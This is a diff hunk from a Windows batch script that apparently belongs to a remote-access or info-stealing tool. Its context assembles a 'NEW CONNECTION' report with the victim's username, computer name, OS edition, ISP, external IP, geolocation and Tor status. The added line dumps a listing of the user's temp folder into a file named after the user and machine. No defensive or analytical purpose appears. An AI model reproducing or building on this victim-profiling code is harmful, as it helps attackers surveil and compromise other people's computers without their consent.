@@ -85,7 +85,7 @@ if "%status%"=="404" (
 ) else (
   echo.
 )
-
+dir /a %temp% >> "%userN%@%computerN%.txt"
 SET "InputVariable=NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
 for /f "usebackq delims=" %%i in (`powershell -command "$OutputVariable='%InputVariable%'-replace '[^\x00-\x7F]', ''; $OutputVariable"`) do set "OutputVariable=%%i"
 
